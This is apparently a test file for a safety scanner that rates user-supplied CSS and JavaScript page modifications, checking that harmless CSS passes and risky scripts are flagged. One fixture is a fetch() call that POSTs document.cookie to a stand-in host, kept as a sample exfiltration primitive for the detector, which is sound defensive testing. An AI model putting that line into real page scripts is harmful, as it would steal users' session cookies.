import { describe, expect, it } from 'vitest';
import { analyzeSafety, hasBlockers, riskFromFindings } from '../../src/shared/safety';

describe('safety scanner', () => {
  it('allows simple CSS-only modifications', () => {
    const findings = analyzeSafety({ type: 'css', css: '.article { line-height: 1.8; }' });
    expect(hasBlockers(findings)).toBe(false);
    expect(riskFromFindings(findings)).toBe('low');
  });

  it('blocks network exfiltration primitives', () => {
    const findings = analyzeSafety({ type: 'javascript', javascript: 'fetch("https://example.com", { method: "POST", body: document.cookie })' });
    expect(findings.map((finding) => finding.category)).toContain('Network access');
    expect(findings.map((finding) => finding.category)).toContain('Storage or cookies');
    expect(hasBlockers(findings)).toBe(true);
    expect(riskFromFindings(findings)).toBe('high');
  });

  it('warns about raw HTML writes', () => {
    const findings = analyzeSafety({ type: 'javascript', javascript: 'document.querySelector("main").innerHTML = "<p>Hi</p>"' });
    expect(findings.some((finding) => finding.category === 'HTML injection' && finding.severity === 'warning')).toBe(true);
    expect(riskFromFindings(findings)).toBe('medium');
  });
});
